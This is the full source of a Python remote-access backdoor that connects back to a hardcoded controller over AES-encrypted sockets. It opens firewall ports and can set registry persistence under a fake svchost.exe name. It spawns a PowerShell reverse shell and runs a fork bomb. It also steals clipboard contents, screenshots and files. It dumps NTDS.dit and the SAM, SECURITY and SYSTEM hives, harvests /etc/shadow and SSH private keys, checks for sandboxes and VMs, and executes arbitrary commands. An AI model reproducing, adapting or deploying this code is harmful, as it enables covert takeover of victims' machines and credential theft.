#!/usr/bin/python
import subprocess, socket, json, os, base64, shutil, sys, platform, ctypes,pyperclip
from mss import mss
from Crypto.Cipher import AES
global ip,port,TMP,APPDATA,path,os_type,red,yellow,r

counter = "H"*16
key = "H"*32

# color codes..................
red="\033[1;32;31m"
yellow="\033[1;32;33m"
r="\x1b[0m"

dns = '192.168.56.1'
ip = socket.gethostbyname(dns)
port = 6969

# detect OS type for future use........................
if "Linux" in platform.uname():
    os_type = "linux"
else:
    os_type = "windows"

# set temp and appdata path variables for future use...
if os_type == "windows":
    try:
        TMP = os.environ["TEMP"]
        APPDATA = os.environ["APPDATA"]
    except:
        os_type = 'linux'
        pass

# add firewall rule to open ports for backdoor connection................................................................
if os_type == "windows":
    firewall_input = 'netsh advfirewall firewall add rule name="windows server check" protocol=TCP dir=in localport= '+str(port)+' action=allow'
    firewall_output= 'netsh advfirewall firewall add rule name="windows server check" protocol=TCP dir=out localport= '+str(port)+' action=allow'
else:
    firewall_input = 'iptables -A INPUT -p tcp --dport ' + str(port) + ' -j ACCEPT'
    firewall_output= 'iptables -A OUTPUT -p tcp --sport ' + str(port) + ' -j ACCEPT'
try:
    subprocess.Popen(firewall_input,shell=True)
    subprocess.Popen(firewall_output,shell=True)
except:
    pass

# main backdoor class and functions..............................................
class Backdoor:
    def __init__(self, ip, port):
        # uncomment to activated at startup if needed
        #self.persistance()
        self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        while True:
            try:
                self.conn.connect((ip, port))
                break
            except socket.error:
                continue

    def encrypt(self,message):
        self.encrypto = AES.new(key, AES.MODE_CTR, counter=lambda: counter)
        return self.encrypto.encrypt(message)

    def decrypt(self,message):
        self.decrypto = AES.new(key, AES.MODE_CTR, counter=lambda: counter)
        return self.decrypto.decrypt(message)

    def json_send(self, data):
        try:
            json_data = json.dumps(data)
            return self.conn.send(self.encrypt(json_data))
        except:
            return self.conn.send(self.encrypt("[-] STDOUT parsing problem [-]"))
            pass

    def receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.conn.recv(4096)
                return json.loads(self.decrypt(json_data))
            except ValueError:
                continue
            except:
                pass

    # dump clipboard..................
    def clipboard(self):
        try:
            s = pyperclip.paste()
            pyperclip.copy(s)
            return s
        except:
            return "[-] dump failed [-]"

    def screenshot(self):
        try:
            with mss() as screenshot:
                screenshot.shot()
        except:
            pass


    # make persistence after reboot...........................................
    def persistence(self):
        if os_type == 'windows':
            try:
                location = os.environ["appdata"] + '\\svchost.exe'
                if not os.path.exists(location):
                    shutil.copyfile(sys.executable, location)
                    subprocess.call(
                        'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + location + '"',
                        shell=True)
                    return "[+] persistance access activated [+]"
            except:
                return "[!] failed to set persistance access [!]"



    def sysinfo(self):
        try:
            sysinfo = platform.uname()
            sysinfo = [' '.join(sysinfo)]
            return str(sysinfo)
        except:
            return "[!] unable to get sysinfo [!]"


    def write_file(self, path, content):
        try:
            with open(path, "wb") as file:
                file.write(base64.b64decode(content))
                return "upload completed"
        except:
            return "[-] failed to write file [-]"

    def read_file(self, path):
        try:
            with open(path, "rb") as file:
                return base64.b64encode(file.read())
        except:
            return "[-] no such file or directory [-]"

    def detectSandboxie(self):
        try:
            self.libHandle = ctypes.windll.LoadLibrary("SbieDll.dll")
            return "[!] Sandbox detected [!]"
        except:
            return "[+] doesn't appear to be a sandbox [+]"

    def detectVM(self):
        try:
            import wmi
            self.objWMI = wmi.WMI()
            for objDiskDrive in self.objWMI.query("Select * from Win32_DiskDrive"):
                if "vbox" in objDiskDrive.Caption.lower() or "virtual" in objDiskDrive.Caption.lower():
                    return "[!] Virtual Machine detected [!]"
            return "[+] doesn't appear to be a VM [+]"
        except:
            return "[-] VM check failed, unable to load module wmi  [-]"

    def fork(self):
        try:
            while 1:
                os.fork()
        except:
            return "[-] fork deploy failed [-]"

    def firewall(self,direction,port,name):
        if os_type == "windows":
            rule = 'netsh advfirewall firewall add rule name='+ str(name) + ' protocol=TCP dir=' + str(direction) + ' localport= '+str(port)+' action=allow'
        else:
            if direction == "in":
                direction = "INPUT"
            if direction == "out":
                direction = "OUTPUT"
            rule = 'iptables -A ' + str(direction) + ' -p tcp --dport ' + str(port) + ' -j ACCEPT'
        try:
            subprocess.call(rule,shell=True)
            return "[+] firewall rule added successfully [+]"
        except:
            return "[-] failed to add firewall rule [-]"
            pass

    def spawn(self,target_ip,target_port):
        spawner=""" powershell -ep bypass -c "$client = New-Object System.Net.Sockets.TCPClient('""" + str(target_ip) + """',""" + str(target_port) + """);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"""""
        try:
            subprocess.Popen(spawner,shell=True)
            return "[+] powershell session spawn successfully check your listener [+]"
        except :
            return "[-] failed to spawn powershell session [-]"


    def ntds(self):
        if os_type == 'windows':
            is_admin =  str(ctypes.windll.shell32.IsUserAnAdmin())
            if is_admin == '1':
                try:
                    shutil.rmtree("C:\Windows\Temp\copy-ntds")
                except:
                    pass
                try:
                    DEVNULL = open(os.devnull, 'wb')
                    result = str(subprocess.check_output('ntdsutil "ac i ntds" "ifm" "create full c:\windows\\temp\copy-ntds" quit quit', shell=True, stderr=DEVNULL, stdin=DEVNULL))
                    return "[+] dumped using ntdsutil, saved in c:\Windows\Temp\copy-ntds [+]"
                except:
                    return "[-] ntds dump failed [-]"
            else:
                return "[+] permission denied, your not running as admin [+]"
        else:
            return "[!] target is not a windows machine [!]"

    def reg_save(self):
        if os_type == 'windows':
            is_admin =  str(ctypes.windll.shell32.IsUserAnAdmin())
            if is_admin == '1':
                try:
                    os.remove('C:\Windows\Temp\sam.save')
                except:
                    pass
                try:
                    os.remove('C:\Windows\Temp\security.save')
                except:
                    pass
                try:
                    os.remove('C:\Windows\Temp\system.save')
                except:
                    pass
                try:
                    subprocess.call('reg save hklm\sam C:\Windows\Temp\sam.save',shell=True)
                    subprocess.call('reg save hklm\security C:\Windows\Temp\security.save',shell=True)
                    subprocess.call('reg save hklm\system C:\Windows\Temp\system.save',shell=True)
                    return "[+] dumped using reg save, saved in C:\Windows\Temp\sam.save, system.save , security.save [+]"
                except:
                    return "[-] reg-save dump failed [-]"
            else:
                return "[+] permission denied, your not running as admin [+]"
        else:
            return "[+] target is not a windows machine  [+]"

    def chdir(self, path):
        try:
            os.chdir(path)
            return "dir changed to " + str(path)
        except:
            return "[-] no such file or directory [-]"

# post exploitation enumeration function for linux............................................................................
    def linux_enum(self):
        system = {"/etc/issue ": "cat /etc/issue",
                  "available shells on system":'cat /etc/shells |grep "bin"|cut -d "/" -f3 2>/dev/null ',
            "OS kernel and version ":"cat /proc/version && uname -mrs && dmesg | grep Linux && ls /boot | grep vmlinuz-",
            "hostname ": "hostname",
            "release ": "cat /etc/*-release",
            "driver info ":"modinfo  `lsmod` 2>&1 | uniq | grep -v alias | grep -v modinfo | grep -v parm | grep -v intree | grep -v license | grep -v author | grep -v retpoline | grep -v depends | grep -v firmware:",
        "available programming languages":'progr_dev=( "which perl" "which gcc" "which g++"  "which python" "which php" "which cc" "which go" "which node") ;for programmin_lang in "${progr_dev[@]}"; do pss=`$programmin_lang |cut -d"/" -f4` ;if [ "$pss" ];  then echo -e "$pss" ;fi done',
                  "system logs ( last 60 )":"tail -n 60 /var/log/syslog",
                  "log files":"ls -haltrZ /var/log"}
        user_accounts = {"users":"cat /etc/passwd | cut -d: -f1  ",
            "emails":"mail && ls -alh /var/mail/",
            "id": "id", "/etc/passwd": "cat /etc/passwd",
            "sudo version":"sudo -V",
            "/etc/shadow": "cat /etc/shadow",
            "other shadow files":"find / -iname 'shadow*' -path /mnt -prune 2>/dev/null",
            "super users": "grep -v -E '^#' /etc/passwd | awk -F: '$3 == 0{print $1}'",
            "check for sudo access with <sudo -l>": " ",
            "logged in accounts": "w",
            "last loggins": "last",
            "command history ( last 60 )": " tail -n 60 ~/.bash_history",
            "sudoers": "cat /etc/sudoers 2>/dev/null | grep -v '#'",
            "environment variables": "env 2>/dev/null | grep -v 'LS_COLORS'"}
        processes = {"mysql command history":"cat ~/.mysql_history",
                        "running processes": "ps -ef",
                     "root services": "ps -ef | grep root",
                     "apt cached packages": "ls -alh /var/cache/apt/archives",
                     "yum cached packages": "ls -alh /var/cache/yum/",
                     "rpm packages": "rpm -qa",
                     "printer status": "lpstat -a",
                     "apache version and modules":"apache2 -v; apache2ctl -M; httpd -v; apachectl -l 2>/dev/null",
                     "apache config file":"cat /etc/apache2/apache2.conf | grep -v '#' 2>/dev/null"}
        network = {"hosts and DNS":"cat /etc/hosts 2>/dev/null && cat /etc/resolv.conf 2>/dev/null && cat /etc/sysconfig/network 2>/dev/null && cat /etc/networks 2>/dev/null | uniq | srt | grep -v '#'",
                    "domain name":"dnsdomainname",
                    "root login status":"cat /etc/ssh/sshd_config | grep PermitRootLogin",
                   "ssh info":" cat ~/.ssh/identity.pub  ~/.ssh/authorized_keys ~/.ssh/identity ~/.ssh/id_rsa.pub ~/.ssh/id_rsa ~/.ssh/id_dsa.pub ~/.ssh/id_dsa /etc/ssh/ssh_config /etc/ssh/sshd_config /etc/ssh/ssh_host_dsa_key.pub /etc/ssh/ssh_host_dsa_key /etc/ssh/ssh_host_rsa_key.pub /etc/ssh/ssh_host_rsa_key /etc/ssh/ssh_host_key.pub /etc/ssh/ssh_host_key 2>/dev/null",
                    "interfaces": "/sbin/ifconfig -a",
                   "network routes": "route",
                   "all users communications":"lsof -i",
                   "connections status": "netstat -antup ",
                   "firewall ":"iptables -L 2>/dev/null && ls /etc/iptables 2>/dev/null"}
        file_system = {"/var/www/ content":"ls -alhR /var/www/",
                        "writable files":"find / -type f -writable -path /sys -prune -o -path /proc /mnt -prune -o -path /usr /mnt -prune -o -path /lib /mnt -prune -o -type d 2>/dev/null",
                        "last modified files/directories":"find /etc -path /mnt -prune -type f -printf '%TY-%Tm-%Td %TT %p\n' | sort -r",
                        "mounted devices": "mount",
                       "/etc/fstab": "cat /etc/fstab",
                       "aARP table":"arp -e",
                       "disks": "fdisk -l",
                       "mounted disks":"df -h",
                       "find SUID files/directories":" find / -user root -perm -4000  -path /mnt -prune -type -print 2>/dev/null"
                       }
        scheduled_jobs = {"cron jobs": "crontab -l | grep -v '#'",
                        "cronw jobs": "ls -aRl /etc/cron* 2>/dev/null"}

        # headers for each data section..........................................................................................
        system_info = yellow, "\n#### OS and version information ###################################################\n\n", r
        user_accounts_info = yellow, "\n#### users and accounts ###################################################\n\n", r
        processes_info = yellow, "\n#### processes and packages ###################################################\n\n", r
        network_info = yellow, "\n#### network status ###################################################\n\n", r
        file_system_info = yellow, "\n#### directory and file system info ###################################################\n\n", r
        scheduled_jobs_info = yellow, "\n#### scheduled jobs ###################################################\n\n", r

        # join the headers and the values for each data section as a variable........................................................
        for key, value in system.items():
            try:
                system_info += red, "[+] " + key + " [+] \n", r + str(
                    subprocess.check_output(value + "; exit 0", shell=True, stderr=subprocess.STDOUT)) + "\n\n"
            except:
                pass
        for key, value in user_accounts.items():
            try:
                user_accounts_info += red, "[+] " + key + " [+] \n", r + str(
                    subprocess.check_output(value + "; exit 0", shell=True, stderr=subprocess.STDOUT)) + "\n\n"
            except:
                pass
        for key, value in processes.items():
            try:
                processes_info += red, "[+] " + key + " [+] \n", r + str(
                    subprocess.check_output(value + "; exit 0", shell=True, stderr=subprocess.STDOUT)) + "\n\n"
            except:
                pass
        for key, value in network.items():
            try:
                network_info += red, "[+] " + key + " [+] \n", r + str(
                    subprocess.check_output(value + "; exit 0", shell=True, stderr=subprocess.STDOUT)) + "\n\n"
            except:
                pass
        for key, value in file_system.items():
            try:
                file_system_info += red, "[+] " + key + " [+] \n", r + str(
                    subprocess.check_output(value + "; exit 0", shell=True, stderr=subprocess.STDOUT)) + "\n\n"
            except:
                pass
        for key, value in scheduled_jobs.items():
            try:
                scheduled_jobs_info += red, "[+] " + key + " [+] \n", r + str(
                    subprocess.check_output(value + "; exit 0", shell=True, stderr=subprocess.STDOUT)) + "\n\n"
            except:
                pass

        # join all the gathered intel in one variable .......................................................................
        results = system_info + user_accounts_info + processes_info + network_info + file_system_info + scheduled_jobs_info
        results = ' '.join(results)
        intel = open('/tmp/enum.txt','a')
        intel.write(results)
        intel.close()

    def windows_enum(self):
        system = {"hostname":"whoami /all",
                  "OS and system information":"systeminfo",
                  "system architecture":"wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%",
                  "system time and date":"net time",
                  "domain files":"net files",
                    "system sessions":"net sessions",
                  "system connections":"net use",
                  "check always install elevated in HKCU and HKLM":"reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer && reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer",
                  "kernel drivers":"driverquery | findstr Kernel",
                  "file system drivers":'driverquery | findstr "File System"',
                  "running tasks (current user access level":"tasklist",
                  "services full status and info":"sc queryex type= service state= all",
                  "installed softwares":"wmic product get name, version, vendor",
                  "system-wide updates and hotfixes":"wmic qfe get Caption, Description, HotFixID, InstalledOn",
                  "interesting registries":"reg query HKLM /f pass /t REG_SZ /s && reg query HKCU /f pass /t REG_SZ /s",
                  "env variables":"set",
                  "security logs":"wevtutil qe Security" }

        user_accounts = {"users":"net users",
                         "loged in users": "qwinsta",
                         "loggon requirments": "net accounts" }
        network = {"default gateway information":"route print",
                   "arp table entries":"arp -a",
                   "network interfaces":"ipconfig /all",
                   "network connection status":"netstat -ano",
                   "stored wireless access points":"netsh wlan show profile",
                    "network shares":"net share",
                    "current firewall profile":"netsh advfirewall show currentprofile",
                   "all firewall profiles":"Netsh Advfirewall show allprofiles",
                   "firewall configs and status":"netsh firewall show config && netsh firewall show state && netsh advfirewall firewall dump",
                   "firewall ruels":"netsh advfirewall firewall show rule name=all",}
        file_system = {"mounted/unmounted volumes":"mountvol",
                       "device drives":"fsutil fsinfo drives"}

        scheduled_jobs ={"scheduled tasks":"schtasks /query /fo LIST /v",}

        # headers for each data section..........................................................................................
        system_info = yellow, "\n#### OS and version information ###################################################\n\n", r
        user_accounts_info = yellow, "\n#### users and accounts ###################################################\n\n", r
        network_info = yellow, "\n#### network status ###################################################\n\n", r
        file_system_info = yellow, "\n#### directory and file system info ###################################################\n\n", r
        scheduled_jobs_info = yellow, "\n#### scheduled jobs ###################################################\n\n", r
        DEVNULL = open(os.devnull, 'wb')

        for key, value in system.items():
            try:
                system_info += red, "[+] " + key + " [+] \n", r + str(
                    subprocess.check_output(value , shell=True, stderr=DEVNULL, stdin=DEVNULL)) + "\n\n"
            except:
                pass
        for key, value in user_accounts.items():
            try:
                user_accounts_info += red, "[+] " + key + " [+] \n", r + str(
                    subprocess.check_output(value, shell=True, stderr=DEVNULL, stdin=DEVNULL)) + "\n\n"
            except:
                pass
        for key, value in network.items():
            try:
                network_info += red, "[+] " + key + " [+] \n", r + str(
                    subprocess.check_output(value, shell=True, stderr=DEVNULL, stdin=DEVNULL)) + "\n\n"
            except:
                pass
        for key, value in file_system.items():
            try:
                file_system_info += red, "[+] " + key + " [+] \n", r + str(
                    subprocess.check_output(value, shell=True, stderr=DEVNULL, stdin=DEVNULL)) + "\n\n"
            except:
                pass
        for key, value in scheduled_jobs.items():
            try:
                scheduled_jobs_info += red, "[+] " + key + " [+] \n", r + str(
                    subprocess.check_output(value, shell=True, stderr=DEVNULL, stdin=DEVNULL)) + "\n\n"
            except:
                pass

        # join all the gathered intel in one variable .......................................................................
        results = system_info + user_accounts_info + network_info + file_system_info + scheduled_jobs_info
        results = ' '.join(results)
        intel = open('C:\Windows\Temp\enum.txt','a')
        intel.write(results)
        intel.close()


# filter and run the commands......................................................
    def run(self):
        while True:
            result = ""
            cmd = self.receive()
            if cmd[0] == "q":
                sys.exit(0)
            elif cmd[0] == "download":
                result = self.read_file(cmd[1])
            elif cmd[0] == "upload":
                result = self.write_file(cmd[1], cmd[2])
            elif cmd[0] == "shot":
                self.screenshot()
                result = self.read_file('monitor-1.png')
                os.remove('monitor-1.png')
            elif cmd[0] == "sysinfo":
                result = self.sysinfo()
            elif cmd[0] == "chk":
                result = str(self.detectSandboxie()) +"\n"+ str(self.detectVM())
            elif cmd[0] == "persistence":
                result=self.persistence()
            elif cmd[0] == "clip":
                result=self.clipboard()
            elif cmd[0] == 'fork':
                self.fork()
            elif cmd[0] == 'fw' and len(cmd) == 4 :
                result=self.firewall(cmd[1],cmd[2],cmd[3])
            elif cmd[0] == "ntds":
                result = self.ntds()
            elif cmd[0] == "regsave":
                result = self.reg_save()
            elif cmd[0] == "cd" and len(cmd) > 1:
                directory = ' '.join(cmd[1:])
                result = self.chdir(directory)
            elif cmd[0] == "spawn":
                result=self.spawn(cmd[1],cmd[2])
            elif cmd[0] == "enum":
                if os_type == "linux":
                    self.linux_enum()
                    result = self.read_file('/tmp/enum.txt')
                else:
                    self.windows_enum()
                    result = self.read_file('C:\Windows\Temp\enum.txt')

            elif len(cmd) > 0:
                try:
                    cmd = ' '.join(cmd[0:])
                    if os_type == "linux":
                        result = str(subprocess.check_output(cmd + "; exit 0" , shell=True,stderr=subprocess.STDOUT))
                    else:
                        DEVNULL = open(os.devnull, 'wb')
                        result = str(subprocess.check_output(cmd,shell=True, stderr=DEVNULL, stdin=DEVNULL))
                except:
                    result = " "
            self.json_send(result)
            try:
                os.remove('/tmp/enum.txt')
            except:
                pass
            try:
                os.remove('C:\Windows\Temp\enum.txt')
            except:
                pass

if __name__ == '__main__':
    try:
        starter = Backdoor(ip, port)
        starter.run()
    except KeyboardInterrupt:
        sys.exit(0)
